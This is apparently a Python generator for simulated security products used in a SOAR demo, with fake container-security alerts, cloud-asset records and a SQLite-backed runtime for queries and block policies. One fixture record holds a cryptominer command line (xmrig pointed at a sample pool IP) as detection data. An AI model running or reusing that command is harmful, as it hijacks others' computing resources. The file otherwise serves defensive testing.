                "name": "prod-checkout-tke",
                "ip": "10.30.0.10",
                "owner": "platform-team",
                "status": "protected",
                "severity": "medium",
                "summary": "统一收银台生产 TKE 集群，运行时防护已启用",
                "data": {
                    "cluster_id": "cls-prod-checkout",
                    "asset_id": "asset-tke-prod-checkout",
                    "business_id": "biz-checkout",
                    "region": "ap-guangzhou",
                    "node_count": 6,
                    "sensor_online": 6,
                },
            },
            {
                "id": "tcss-alert-20260724-0001",
                "kind": "tcss_alert",
                "name": "容器异常外联",
                "ip": DEFAULT_C2_IP,
                "owner": "platform-team",
                "status": "new",
                "severity": "high",
                "summary": "checkout-api Pod 连接已知矿池地址",
                "data": {
                    "alert_id": "tcss-alert-20260724-0001",
                    "cluster_id": "cls-prod-checkout",
                    "namespace": "checkout-prod",
                    "workload": "checkout-api",
                    "pod_name": "checkout-api-7cdd7d9c8b-h2k9s",
                    "node_ip": "10.30.1.21",
                    "src_ip": "10.30.2.17",
                    "dst_ip": DEFAULT_C2_IP,
                    "external_ip": DEFAULT_C2_IP,
                    "dst_port": 3333,
                    "process_name": "xmrig",
                    "alert_type": "malicious_outbound",
                    "confidence": 97,
                    "trace_id": "demo-trace-container-0005",
                    "occurred_at": "2026-07-24T10:28:19+08:00",
                },
            },
            {
                "id": "tcss-process-20260724-0001",
                "kind": "tcss_process",
                "name": "xmrig",
                "ip": "10.30.2.17",
                "owner": "platform-team",
                "status": "running",
                "severity": "high",
                "summary": "容器中发现矿池进程 xmrig",
                "data": {
                    "cluster_id": "cls-prod-checkout",
                    "namespace": "checkout-prod",
                    "pod_name": "checkout-api-7cdd7d9c8b-h2k9s",
                    "pid": 884,
                    "command_line": "/tmp/xmrig -o 198.51.100.66:3333",
                    "trace_id": "demo-trace-container-0005",
                },
            },
        ],
        "actions": [
            health_action(),
            action(
                "query_clusters",
                "查询容器集群与传感器状态",
                record_kinds=["tcss_cluster"],
                filter_map={"cluster_id": ["id", "cluster_id"], "status": ["status"]},
                parameters={
                    "cluster_id": parameter("TKE 集群 ID", order=0),
                    "status": parameter("防护状态", order=1),
                },
                sample={"cluster_id": "cls-prod-checkout"},
            ),
            action(
                "query_runtime_alerts",
                "查询容器运行时安全告警",
                record_kinds=["tcss_alert"],
                filter_map={
                    "alert_id": ["id", "alert_id"],
                    "cluster_id": ["cluster_id"],
                    "severity": ["severity"],
                    "status": ["status"],
                },
                parameters={
                    "alert_id": parameter("容器安全告警 ID", order=0),
                    "cluster_id": parameter("TKE 集群 ID", order=1),
                    "severity": parameter("告警等级", order=2),
                    "status": parameter("告警状态", order=3),
                    "limit": parameter("返回数量", "integer", default=50, order=4),
                },
                sample={"cluster_id": "cls-prod-checkout", "severity": "high"},
            ),
            action(
                "query_runtime_processes",
                "查询容器异常进程线索",
                record_kinds=["tcss_process"],
                filter_map={
                    "cluster_id": ["cluster_id"],
                    "pod_name": ["pod_name"],
                    "process_name": ["name"],
                },
                parameters={
                    "cluster_id": parameter("TKE 集群 ID", required=True, order=0),
                    "pod_name": parameter("Pod 名称", order=1),
                    "process_name": parameter("进程名", order=2),
                    "limit": parameter("返回数量", "integer", default=50, order=3),
                },
                sample={"cluster_id": "cls-prod-checkout", "process_name": "xmrig"},
            ),
            action(
                "query_malicious_connections",
                "查询容器恶意外联线索",
                record_kinds=["tcss_alert"],
                filter_map={
                    "cluster_id": ["cluster_id"],
                    "external_ip": ["external_ip", "dst_ip", "ip"],
                    "workload": ["workload"],
                },
                parameters={
                    "cluster_id": parameter("TKE 集群 ID", required=True, order=0),
                    "external_ip": parameter("外联 IP", order=1),
                    "workload": parameter("工作负载名称", order=2),
                    "limit": parameter("返回数量", "integer", default=50, order=3),
                },
                sample={"cluster_id": "cls-prod-checkout", "external_ip": DEFAULT_C2_IP},
            ),
            action(
                "update_alert_status",
                "更新容器安全告警状态",
                operation="update_record",
                classify="write",
                record_kinds=["tcss_alert"],
                filter_map={"alert_id": ["id", "alert_id"]},
                target_params=["alert_id"],
                parameters={
                    "alert_id": parameter("容器安全告警 ID", required=True, order=0),
                    "status": parameter("目标状态", default="processing", order=1),
                    "comment": parameter("处置说明", default="SOAR 已联动网络侧阻断", order=2),
                    **audit_parameters(),
                },
                sample={
                    "alert_id": "tcss-alert-20260724-0001",
                    "status": "processing",
                    "comment": "已阻断矿池外联 IP",
                    "trace_id": "demo-trace-container-0005",
                },
            ),
            history_action(),
        ],
    },
    {
        "name": "tencent_asset_sim",
        "module": "tencent_asset_sim",
        "product_name": "腾讯云资产中心（模拟）",
        "description": "离线模拟腾讯云主机、业务系统、负责人、VPC 和互联网暴露面资产上下文",
        "category": "云服务",
        "letter": "A",
        "colors": ("#006d75", "#5cdbd3"),
        "health_components": ["云资产同步", "负责人映射", "业务关系索引", "暴露面索引"],
        "records": [
            {
                "id": "asset-cvm-prod-web-01",
                "kind": "cloud_asset",
                "name": "prod-web-01",
                "ip": DEFAULT_WEB_IP,
                "owner": "alice",
                "status": "online",
                "severity": "critical",
                "summary": "统一收银台公网 Web 主机，关联 WAF 域名并暴露 80/443",
                "data": {
                    "asset_id": "asset-cvm-prod-web-01",
                    "host_id": "ins-prod-web-01",
                    "asset_type": "cvm",
                    "business_id": "biz-checkout",
                    "business_name": "统一收银台",
                    "department": "支付业务部",
                    "owner_account": "alice",
                    "owner_name": "张敏",
                    "owner_email": "alice@example.com",
                    "is_critical": True,
                    "exposure": "internet",
                    "public_ip": "198.18.0.23",
                    "domains": ["checkout.example.com"],
                    "open_ports": [80, 443],
                    "vpc_id": "vpc-web-prod",
                    "region": "ap-guangzhou",
                },
            },
            {
                "id": "asset-cvm-order-db-01",
                "kind": "cloud_asset",
                "name": "order-db-01",
                "ip": DEFAULT_DB_IP,
                "owner": "bob",
                "status": "online",
                "severity": "critical",
                "summary": "订单核心数据库，仅允许业务 VPC 按白名单访问",
                "data": {
                    "asset_id": "asset-cvm-order-db-01",
                    "host_id": "ins-order-db-01",
                    "asset_type": "cvm",
                    "business_id": "biz-order",
                    "business_name": "订单中心",
                    "department": "平台工程部",
                    "owner_account": "bob",
                    "owner_name": "李伟",
                    "owner_email": "bob@example.com",
                    "is_critical": True,
                    "exposure": "private",
                    "public_ip": "",
                    "domains": [],
                    "open_ports": [3306],
                    "vpc_id": "vpc-data-prod",
                    "region": "ap-guangzhou",
                },
            },
            {
                "id": "asset-clb-checkout-01",
                "kind": "cloud_asset",
                "name": "checkout-clb-01",
                "ip": "10.10.8.10",
                "owner": "alice",
                "status": "online",
                "severity": "high",
                "summary": "统一收银台公网负载均衡，前置腾讯云 WAF",
                "data": {
                    "asset_id": "asset-clb-checkout-01",
                    "asset_type": "clb",
                    "business_id": "biz-checkout",
                    "business_name": "统一收银台",
                    "department": "支付业务部",
                    "owner_account": "alice",
                    "owner_name": "张敏",
                    "owner_email": "alice@example.com",
                    "is_critical": True,
                    "exposure": "internet",
                    "public_ip": "198.18.0.10",
                    "domains": ["checkout.example.com"],
                    "open_ports": [443],
                    "vpc_id": "vpc-web-prod",
                    "region": "ap-guangzhou",
                },
            },
            {
                "id": "asset-tke-prod-checkout",
                "kind": "cloud_asset",
                "name": "prod-checkout-tke",
                "ip": "10.30.0.10",
                "owner": "platform-team",
                "status": "online",
                "severity": "high",
                "summary": "统一收银台生产 TKE 集群，启用容器安全运行时防护",
                "data": {
                    "asset_id": "asset-tke-prod-checkout",
                    "cluster_id": "cls-prod-checkout",
                    "asset_type": "tke_cluster",
                    "business_id": "biz-checkout",
                    "business_name": "统一收银台",
                    "department": "平台工程部",
                    "owner_account": "platform-team",
                    "owner_name": "平台团队",
                    "owner_email": "platform@example.com",
                    "is_critical": True,
                    "exposure": "private",
                    "public_ip": "",
                    "domains": [],
                    "open_ports": [6443],
                    "vpc_id": "vpc-container-prod",
                    "region": "ap-guangzhou",
                },
            },
        ],
        "actions": [
            health_action(),
            action(
                "list_assets",
                "查询云资产列表",
                record_kinds=["cloud_asset"],
                filter_map={
                    "asset_type": ["asset_type"],
                    "owner": ["owner", "owner_account"],
                    "status": ["status"],
                    "business_id": ["business_id"],
                },
                parameters={
                    "asset_type": parameter("资产类型", order=0),
                    "owner": parameter("负责人账号；样例 alice、bob、platform-team", order=1),
                    "status": parameter("资产状态", order=2),
                    "business_id": parameter("业务系统 ID", order=3),
                    "limit": parameter("返回数量", "integer", default=50, order=4),
                },
                sample={"owner": "alice", "limit": 20},
            ),
            action(
                "query_asset_by_ip",
                "根据 IP 查询主机、业务、负责人和暴露面",
                record_kinds=["cloud_asset"],
                filter_map={"ip": ["ip", "public_ip"]},
                parameters={"ip": parameter("内网或公网 IP", required=True, order=0)},
                sample={"ip": DEFAULT_WEB_IP},
            ),
            action(
                "query_asset_by_id",
                "根据资产 ID 查询资产上下文",
                record_kinds=["cloud_asset"],
                filter_map={"asset_id": ["id", "asset_id"]},
                parameters={"asset_id": parameter("资产 ID", required=True, order=0)},
                sample={"asset_id": "asset-cvm-prod-web-01"},
            ),
            action(
                "query_assets_by_owner",
                "根据负责人账号查询名下资产",
                record_kinds=["cloud_asset"],
                filter_map={"owner": ["owner", "owner_account"]},
                parameters={
                    "owner": parameter("负责人账号；样例 alice、bob、platform-team", required=True, order=0),
                    "limit": parameter("返回数量", "integer", default=50, order=1),
                },
                sample={"owner": "alice"},
            ),
            action(
                "list_exposed_assets",
                "查询互联网暴露资产",
                record_kinds=["cloud_asset"],
                filter_map={
                    "exposure": ["exposure"],
                    "business_id": ["business_id"],
                    "owner": ["owner", "owner_account"],
                },
                parameters={
                    "exposure": parameter("暴露类型", default="internet", order=0),
                    "business_id": parameter("业务系统 ID", order=1),
                    "owner": parameter("负责人账号", order=2),
                    "limit": parameter("返回数量", "integer", default=50, order=3),
                },
                sample={"exposure": "internet"},
            ),
            action(
                "query_business_context",
                "查询业务系统关联资产与负责人",
                record_kinds=["cloud_asset"],
                filter_map={"business_id": ["business_id"]},
                parameters={
                    "business_id": parameter("业务系统 ID", required=True, order=0),
                    "limit": parameter("返回数量", "integer", default=50, order=1),
                },
                sample={"business_id": "biz-checkout"},
            ),
            action(
                "create_asset",
                "新增模拟云资产",
                operation="create_record",
                classify="write",
                create_kind="cloud_asset",
                id_param="asset_id",
                result_status="online",
                parameters={
                    "asset_id": parameter("资产 ID；不填则自动生成", order=0),
                    "asset_name": parameter("资产名称", required=True, order=1),
                    "ip": parameter("资产内网 IP", required=True, order=2),
                    "asset_type": parameter("资产类型", default="cvm", order=3),
                    "owner": parameter("负责人账号", default="secops", order=4),
                    "business_id": parameter("业务系统 ID", default="biz-demo", order=5),
                    "business_name": parameter("业务系统名称", default="演示业务", order=6),
                    "exposure": parameter("暴露类型", default="private", order=7),
                    "severity": parameter("资产等级", default="medium", order=8),
                    "summary": parameter("资产说明", default="手工新增模拟云资产", order=9),
                    **audit_parameters(20),
                },
                sample={
                    "asset_id": "asset-cvm-demo-01",
                    "asset_name": "demo-api-01",
                    "ip": "10.40.8.21",
                    "asset_type": "cvm",
                    "owner": "secops",
                    "business_id": "biz-demo",
                    "business_name": "演示业务",
                    "exposure": "private",
                    "trace_id": "demo-trace-asset-crud",
                },
            ),
            action(
                "update_asset",
                "更新模拟云资产信息",
                operation="update_record",
                classify="write",
                record_kinds=["cloud_asset"],
                filter_map={"asset_id": ["id", "asset_id"]},
                target_params=["asset_id"],
                parameters={
                    "asset_id": parameter("资产 ID", required=True, order=0),
                    "asset_name": parameter("资产名称", order=1),
                    "owner": parameter("负责人账号", order=2),
                    "business_id": parameter("业务系统 ID", order=3),
                    "business_name": parameter("业务系统名称", order=4),
                    "exposure": parameter("暴露类型", order=5),
                    "status": parameter("资产状态", order=6),
                    "severity": parameter("资产等级", order=7),
                    "summary": parameter("资产说明", order=8),
                    **audit_parameters(20),
                },
                sample={
                    "asset_id": "asset-cvm-prod-web-01",
                    "owner": "alice",
                    "exposure": "internet",
                    "status": "online",
                    "trace_id": "demo-trace-asset-update",
                },
            ),
            action(
                "delete_asset",
                "删除模拟云资产",
                operation="delete_record",
                classify="write",
                record_kinds=["cloud_asset"],
                filter_map={"asset_id": ["id", "asset_id"]},
                target_params=["asset_id"],
                parameters={
                    "asset_id": parameter("资产 ID", required=True, order=0),
                    "reason": parameter("删除原因", default="资产下线", order=1),
                    **audit_parameters(),
                },
                sample={
                    "asset_id": "asset-cvm-demo-01",
                    "reason": "演示资产下线",
                    "trace_id": "demo-trace-asset-crud",
                },
            ),
            history_action(),
        ],
    },
]


RUNTIME_TEMPLATE = Template(r'''# -*- coding: utf-8 -*-
import json
import os
import random
import sqlite3
import time
import uuid
from datetime import datetime, timedelta, timezone


APP_NAME = $APP_NAME
PRODUCT_NAME = $PRODUCT_NAME
APP_DESCRIPTION = $APP_DESCRIPTION
APP_VERSION = $APP_VERSION
DEFAULT_RECORDS = json.loads($DEFAULT_RECORDS)
ACTION_DEFINITIONS = json.loads($ACTION_DEFINITIONS)
HEALTH_COMPONENTS = json.loads($HEALTH_COMPONENTS)
TZ = timezone(timedelta(hours=8))


def _now_dt():
    return datetime.now(TZ)


def _now():
    return _now_dt().isoformat(timespec="seconds")


def _response(code=200, msg="", data=None):
    message = msg or ("success" if code == 200 else "failed")
    return {
        "code": code,
        "msg": msg,
        "data": data or {},
        "summary": {"statusCode": str(code), "msg": message},
    }


def _db_path(assets):
    return (assets or {}).get("database_path") or f"/tmp/{APP_NAME}.db"


def _connect(assets):
    path = _db_path(assets)
    parent = os.path.dirname(path)
    if parent:
        os.makedirs(parent, exist_ok=True)
    conn = sqlite3.connect(path)
    conn.row_factory = sqlite3.Row
    _init_db(conn)
    return conn


def _init_db(conn):
    conn.execute("""
        CREATE TABLE IF NOT EXISTS records (
            id TEXT PRIMARY KEY,
            kind TEXT NOT NULL,
            name TEXT,
            ip TEXT,
            owner TEXT,
            status TEXT,
            severity TEXT,
            summary TEXT,
            data TEXT,
            created_at TEXT,
            updated_at TEXT
        )
    """)
    conn.execute("""
        CREATE TABLE IF NOT EXISTS operations (
            operation_id TEXT PRIMARY KEY,
            action TEXT NOT NULL,
            target TEXT,
            policy_id TEXT,
            status TEXT,
            operator TEXT,
            trigger_source TEXT,
            trace_id TEXT,
            reason TEXT,
            ttl_minutes INTEGER,
            expires_at TEXT,
            details TEXT,
            timestamp TEXT NOT NULL
        )
    """)
    count = conn.execute("SELECT COUNT(*) AS count FROM records").fetchone()["count"]
    if count == 0:
        for record in DEFAULT_RECORDS:
            _insert_record(conn, record, commit=False)
    conn.commit()


def _insert_record(conn, record, commit=True):
    now = _now()
    value = dict(record)
    conn.execute(
        """
        INSERT OR REPLACE INTO records (
            id, kind, name, ip, owner, status, severity, summary,
            data, created_at, updated_at
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """,
        (
            value.get("id") or f"{APP_NAME}-{uuid.uuid4().hex[:12]}",
            value.get("kind") or "simulated_record",
            value.get("name") or "",
            value.get("ip") or "",
            value.get("owner") or "",
            value.get("status") or "active",
            value.get("severity") or "medium",
            value.get("summary") or "",
            json.dumps(value.get("data") or {}, ensure_ascii=False),
            value.get("created_at") or now,
            value.get("updated_at") or now,
        ),
    )
    if commit:
        conn.commit()


def _parse_json(value):
    if not value:
        return {}
    try:
        return json.loads(value)
    except Exception:
        return {"raw": value}


def _compact(value):
    if value in (None, "", [], {}):
        return ""
    if isinstance(value, list):
        return ",".join(str(item) for item in value)
    if isinstance(value, dict):
        return ",".join(
            f"{key}={_compact(item)}"
            for key, item in value.items()
            if item not in (None, "", [], {})
        )
    return str(value)


def _record_from_row(row):
    details = _parse_json(row["data"])
    record = {
        "id": row["id"],
        "type": row["kind"],
        "kind": row["kind"],
        "name": row["name"],
        "ip": row["ip"],
        "owner": row["owner"],
        "status": row["status"],
        "severity": row["severity"],
        "summary": row["summary"],
        "details": details,
        "created_at": row["created_at"],
        "updated_at": row["updated_at"],
    }
    for key, value in details.items():
        if key not in record:
            record[key] = value
    preferred = [
        "asset_id", "host_id", "cluster_id", "business_id", "business_name",
        "src_ip", "dst_ip", "external_ip", "domain", "owner_account",
        "confidence", "trace_id", "policy_id", "expires_at",
    ]
    record["key_info"] = "；".join(
        f"{key}={_compact(record.get(key))}"
        for key in preferred
        if record.get(key) not in (None, "", [], {})
    )
    return record


def _all_records(conn):
    rows = conn.execute(
        "SELECT * FROM records ORDER BY updated_at DESC, id ASC"
    ).fetchall()
    return [_record_from_row(row) for row in rows]


def _definition(action_name):
    return next(
        (item for item in ACTION_DEFINITIONS if item["action"] == action_name),
        None,
    )


def _apply_defaults(params, action_def):
    values = dict(params or {})
    for name, metadata in (action_def.get("parameters") or {}).items():
        if name not in values and "default_value" in metadata:
            values[name] = metadata["default_value"]
    return values


def _validate_required(params, action_def):
    missing = []
    for name, metadata in (action_def.get("parameters") or {}).items():
        if metadata.get("required") and params.get(name) in (None, ""):
            missing.append(name)
    if missing:
        return _response(
            400,
            f"缺少必填参数: {', '.join(missing)}",
            {"result": "参数校验失败", "missing_parameters": missing},
        )
    return None


def _value(record, path):
    current = record
    for part in path.split("."):
        if not isinstance(current, dict):
            return None
        current = current.get(part)
    return current


def _matches(record, params, action_def):
    kinds = action_def.get("record_kinds") or []
    if kinds and record.get("kind") not in kinds:
        return False
    for parameter_name, paths in (action_def.get("filter_map") or {}).items():
        expected = params.get(parameter_name)
        if expected in (None, ""):
            continue
        expected_text = str(expected).strip().lower()
        values = [_value(record, path) for path in paths]
        if not any(expected_text in _compact(value).lower() for value in values):
            return False
    return True


def _limit(params, default=50):
    try:
        return max(1, min(int(params.get("limit", default)), 500))
    except Exception:
        return default


def _query(conn, params, action_def):
    matches = [
        record
        for record in _all_records(conn)
        if _matches(record, params, action_def)
    ]
    selected = matches[:_limit(params)]
    return _response(
        data={
            "result": f"查询完成，共 {len(matches)} 条匹配记录",
            "records": selected,
            "record": selected[0] if selected else {},
            "total_count": len(matches),
            "query": params,
        }
    )


def _safe_float(value, default):
    try:
        return float(value)
    except Exception:
        return default


def _simulate_latency(assets):
    assets = assets or {}
    low = max(0.0, _safe_float(assets.get("delay_min_seconds"), 1.0))
    high = max(low, _safe_float(assets.get("delay_max_seconds"), 3.0))
    delay = round(random.uniform(low, high), 2)
    if delay:
        time.sleep(delay)
    return delay


def _availability_error(assets):
    assets = assets or {}
    api_status = str(assets.get("simulated_api_status") or "healthy").lower()
    auth_status = str(assets.get("simulated_auth_status") or "authorized").lower()
    if auth_status not in ("authorized", "ok", "healthy"):
        return _response(
            403,
            "模拟鉴权失败",
            {
                "result": "permission_denied",
                "api_status": api_status,
                "auth_status": auth_status,
            },
        )
    if api_status in ("unavailable", "down", "offline"):
        return _response(
            503,
            "模拟 API 不可用",
            {
                "result": "service_unavailable",
                "api_status": api_status,
                "auth_status": auth_status,
            },
        )
    return None


def _health(assets):
    assets = assets or {}
    api_status = str(assets.get("simulated_api_status") or "healthy").lower()
    auth_status = str(assets.get("simulated_auth_status") or "authorized").lower()
    link_status = str(assets.get("simulated_link_status") or "healthy").lower()
    code = 200
    message = "健康检查成功"
    if auth_status not in ("authorized", "ok", "healthy"):
        code = 403
        message = "模拟鉴权失败"
    elif api_status in ("unavailable", "down", "offline"):
        code = 503
        message = "模拟 API 不可用"
    try:
        conn = _connect(assets)
        records = _all_records(conn)
        policy_count = len(
            [record for record in records if "policy" in record.get("kind", "") or "rule" in record.get("kind", "")]
        )
        conn.close()
        components = []
        for name in HEALTH_COMPONENTS:
            component_status = "healthy"
            if "鉴权" in name:
                component_status = auth_status
            elif "链路" in name or "Kafka" in name or "Syslog" in name:
                component_status = link_status
            elif api_status != "healthy":
                component_status = api_status
            components.append(
                {
                    "name": name,
                    "status": component_status,
                    "latency_ms": random.randint(8, 65),
                }
            )
        system_info = {
            "product": PRODUCT_NAME,
            "version": APP_VERSION,
            "status": "running" if code == 200 else "abnormal",
            "api_status": api_status,
            "auth_status": auth_status,
            "link_status": link_status,
            "database_path": _db_path(assets),
            "record_count": len(records),
            "policy_count": policy_count,
            "scenario_profile": assets.get("scenario_profile") or "default",
            "last_alert_time": max(
                [
                    record.get("occurred_at")
                    for record in records
                    if record.get("occurred_at")
                ]
                or [""]
            ),
            "components": components,
            "sample_values": {
                "record_ids": [record["id"] for record in records[:10]],
                "ips": sorted({record["ip"] for record in records if record.get("ip")})[:10],
                "owners": sorted({record["owner"] for record in records if record.get("owner")})[:10],
                "trace_ids": sorted(
                    {record.get("trace_id") for record in records if record.get("trace_id")}
                )[:10],
            },
            "sample_records": records[:5],
        }
        return _response(
            code,
            "" if code == 200 else message,
            {"msg": message, "system_info": system_info},
        )
    except Exception as exc:
        return _response(
            500,
            str(exc),
            {"msg": f"健康检查失败: {exc}", "system_info": {}},
        )


def _parse_time(value):
    if not value:
        return None
    text = str(value).strip()
    if text.endswith("Z"):
        text = text[:-1] + "+00:00"
    try:
        parsed = datetime.fromisoformat(text)
        if parsed.tzinfo is None:
            parsed = parsed.replace(tzinfo=TZ)
        return parsed
    except Exception:
        return None


def _target(params, action_def):
    values = []
    for name in action_def.get("target_params") or []:
        value = params.get(name)
        if value not in (None, ""):
            values.append(str(value))
    if values:
        return " -> ".join(values)
    for name in ("policy_id", "alert_id", "asset_id", "host_id", "ip", "target"):
        if params.get(name) not in (None, ""):
            return str(params[name])
    return APP_NAME


def _log_operation(
    conn,
    action_name,
    params,
    action_def,
    *,
    status,
    policy_id="",
    expires_at="",
    details=None,
):
    operation_id = f"op-{datetime.now(TZ).strftime('%Y%m%d%H%M%S')}-{uuid.uuid4().hex[:8]}"
    conn.execute(
        """
        INSERT INTO operations (
            operation_id, action, target, policy_id, status, operator,
            trigger_source, trace_id, reason, ttl_minutes, expires_at,
            details, timestamp
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """,
        (
            operation_id,
            action_name,
            _target(params, action_def),
            policy_id,
            status,
            params.get("operator") or "soar-demo",
            params.get("trigger_source") or "manual",
            params.get("trace_id") or "",
            params.get("reason") or params.get("comment") or "",
            int(params.get("ttl_minutes") or 0),
            expires_at,
            json.dumps(details or {}, ensure_ascii=False),
            _now(),
        ),
    )
    conn.commit()
    return {
        "operation_id": operation_id,
        "action": action_name,
        "target": _target(params, action_def),
        "policy_id": policy_id,
        "status": status,
        "operator": params.get("operator") or "soar-demo",
        "trigger_source": params.get("trigger_source") or "manual",
        "trace_id": params.get("trace_id") or "",
        "reason": params.get("reason") or params.get("comment") or "",
        "ttl_minutes": int(params.get("ttl_minutes") or 0),
        "expires_at": expires_at,
        "timestamp": _now(),
    }


def _policy_duplicate(records, params, action_def):
    target_fields = action_def.get("target_params") or []
    for record in records:
        if record.get("kind") != action_def.get("policy_kind"):
            continue
        if record.get("status") not in ("active", "enabled"):
            continue
        if all(
            _compact(record.get(name)).lower() == _compact(params.get(name)).lower()
            for name in target_fields
        ):
            return record
    return None


def _create_policy(conn, action_name, params, assets, action_def):
    existing = _policy_duplicate(_all_records(conn), params, action_def)
    if existing:
        operation = _log_operation(
            conn,
            action_name,
            params,
            action_def,
            status="duplicate",
            policy_id=existing["id"],
            expires_at=existing.get("expires_at") or "",
            details={"duplicate": True},
        )
        return _response(
            data={
                "result": "目标已存在有效策略，返回现有策略",
                "policy": existing,
                "policy_id": existing["id"],
                "operation": operation,
                "duplicate": True,
                "affected_count": 0,
            }
        )
    latency = _simulate_latency(assets)
    ttl_minutes = max(0, int(params.get("ttl_minutes") or 0))
    expires_at = ""
    if ttl_minutes:
        expires_at = (_now_dt() + timedelta(minutes=ttl_minutes)).isoformat(timespec="seconds")
    prefix = action_def.get("policy_prefix") or "policy"
    policy_id = f"{prefix}-{datetime.now(TZ).strftime('%Y%m%d%H%M%S')}-{uuid.uuid4().hex[:6]}"
    details = dict(params)
    details.update(
        {
            "policy_id": policy_id,
            "product": PRODUCT_NAME,
            "target": _target(params, action_def),
            "expires_at": expires_at,
            "created_at": _now(),
            "latency_seconds": latency,
        }
    )
    ip = params.get("ip") or params.get("source") or ""
    record = {
        "id": policy_id,
        "kind": action_def.get("policy_kind") or "block_policy",
        "name": params.get("policy_name") or action_def["description"],
        "ip": ip,
        "owner": params.get("operator") or "soar-demo",
        "status": action_def.get("result_status") or "active",
        "severity": params.get("severity") or "high",
        "summary": params.get("reason") or action_def["description"],
        "data": details,
    }
    _insert_record(conn, record)
    policy = next(item for item in _all_records(conn) if item["id"] == policy_id)
    operation = _log_operation(
        conn,
        action_name,
        params,
        action_def,
        status=policy["status"],
        policy_id=policy_id,
        expires_at=expires_at,
        details={"latency_seconds": latency},
    )
    return _response(
        data={
            "result": "模拟策略创建成功",
            "policy": policy,
            "policy_id": policy_id,
            "expires_at": expires_at,
            "operation": operation,
            "duplicate": False,
            "affected_count": 1,
        }
    )


def _policy_matches(record, params, action_def):
    if record.get("kind") != action_def.get("policy_kind"):
        return False
    if params.get("policy_id") and record.get("id") != params.get("policy_id"):
        return False
    compared = False
    for name in action_def.get("target_params") or []:
        if name == "policy_id" or params.get(name) in (None, ""):
            continue
        compared = True
        if _compact(record.get(name)).lower() != _compact(params.get(name)).lower():
            return False
    return bool(params.get("policy_id") or compared)


def _release_policy(conn, action_name, params, assets, action_def):
    latency = _simulate_latency(assets)
    matches = [
        record
        for record in _all_records(conn)
        if _policy_matches(record, params, action_def)
    ]
    if not matches:
        return _response(
            404,
            "未找到匹配策略",
            {"result": "policy_not_found", "affected_count": 0},
        )
    now = _now()
    affected = 0
    for record in matches:
        details = dict(record.get("details") or {})
        details.update(
            {
                "released_at": now,
                "release_reason": params.get("reason") or "",
                "release_operator": params.get("operator") or "soar-demo",
            }
        )
        if record["status"] not in ("released", "expired", "deleted"):
            affected += 1
        conn.execute(
            "UPDATE records SET status = ?, data = ?, updated_at = ? WHERE id = ?",
            (
                action_def.get("result_status") or "released",
                json.dumps(details, ensure_ascii=False),
                now,
                record["id"],
            ),
        )
    conn.commit()
    policies = [
        record for record in _all_records(conn) if record["id"] in {item["id"] for item in matches}
    ]
    operation = _log_operation(
        conn,
        action_name,
        params,
        action_def,
        status=action_def.get("result_status") or "released",
        policy_id=policies[0]["id"],
        details={"latency_seconds": latency, "affected_count": affected},
    )
    return _response(
        data={
            "result": f"模拟策略解除完成，影响 {affected} 条策略",
            "policies": policies,
            "policy": policies[0],
            "policy_id": policies[0]["id"],
            "operation": operation,
            "affected_count": affected,
        }
    )


def _expire_policies(conn, action_name, params, assets, action_def):
    latency = _simulate_latency(assets)
    as_of = _parse_time(params.get("as_of")) or _now_dt()
    due = []
    for record in _all_records(conn):
        if record.get("kind") != action_def.get("policy_kind"):
            continue
        if record.get("status") not in ("active", "enabled"):
            continue
        expires_at = _parse_time(record.get("expires_at"))
        if expires_at and expires_at <= as_of:
            due.append(record)
    now = _now()
    for record in due:
        details = dict(record.get("details") or {})
        details.update(
            {
                "expired_at": now,
                "expiry_scan_time": as_of.isoformat(timespec="seconds"),
            }
        )
        conn.execute(
            "UPDATE records SET status = ?, data = ?, updated_at = ? WHERE id = ?",
            (
                action_def.get("result_status") or "expired",
                json.dumps(details, ensure_ascii=False),
                now,
                record["id"],
            ),
        )
    conn.commit()
    policies = [
        record for record in _all_records(conn) if record["id"] in {item["id"] for item in due}
    ]
    operation = _log_operation(
        conn,
        action_name,
        params,
        action_def,
        status="completed",
        details={
            "latency_seconds": latency,
            "affected_count": len(policies),
            "as_of": as_of.isoformat(timespec="seconds"),
        },
    )
    return _response(
        data={
            "result": f"TTL 扫描完成，共处理 {len(policies)} 条到期策略",
            "policies": policies,
            "records": policies,
            "operation": operation,
            "affected_count": len(policies),
        }
    )


def _update_record(conn, action_name, params, assets, action_def):
    latency = _simulate_latency(assets)
    matches = [
        record
        for record in _all_records(conn)
        if _matches(record, params, action_def)
    ]
    if not matches:
        return _response(
            404,
            "未找到匹配记录",
            {"result": "record_not_found", "affected_count": 0},
        )
    now = _now()
    reserved = {
        "alert_id", "asset_id", "host_id", "cluster_id", "status", "severity",
        "owner", "asset_name", "summary",
    }
    for record in matches:
        details = dict(record.get("details") or {})
        details.update(
            {
                key: value
                for key, value in params.items()
                if value not in (None, "") and key not in reserved
            }
        )
        conn.execute(
            """
            UPDATE records
            SET name = ?, owner = ?, status = ?, severity = ?, summary = ?,
                data = ?, updated_at = ?
            WHERE id = ?
            """,
            (
                params.get("asset_name") or record["name"],
                params.get("owner") or record["owner"],
                params.get("status") or action_def.get("result_status") or record["status"],
                params.get("severity") or record["severity"],
                params.get("summary") or record["summary"],
                json.dumps(details, ensure_ascii=False),
                now,
                record["id"],
            ),
        )
    conn.commit()
    records = [
        record for record in _all_records(conn) if record["id"] in {item["id"] for item in matches}
    ]
    operation = _log_operation(
        conn,
        action_name,
        params,
        action_def,
        status=records[0]["status"],
        details={"latency_seconds": latency, "affected_count": len(records)},
    )
    return _response(
        data={
            "result": f"模拟记录更新完成，影响 {len(records)} 条记录",
            "records": records,
            "record": records[0],
            "operation": operation,
            "affected_count": len(records),
        }
    )


def _new_record_id(params, action_def):
    id_param = action_def.get("id_param")
    if id_param and params.get(id_param):
        return str(params[id_param])
    prefix = action_def.get("create_kind") or APP_NAME
    return f"{prefix}-{datetime.now(TZ).strftime('%Y%m%d%H%M%S')}-{uuid.uuid4().hex[:6]}"


def _create_record(conn, action_name, params, assets, action_def):
    latency = _simulate_latency(assets)
    record_id = _new_record_id(params, action_def)
    name = (
        params.get("asset_name")
        or params.get("alert_name")
        or params.get("name")
        or action_def["description"]
    )
    ip = params.get("ip") or params.get("src_ip") or ""
    details = dict(params)
    details[action_def.get("id_param") or "record_id"] = record_id
    details["created_by_action"] = action_name
    record = {
        "id": record_id,
        "kind": action_def.get("create_kind") or "simulated_record",
        "name": name,
        "ip": ip,
        "owner": params.get("owner") or params.get("operator") or "soar-demo",
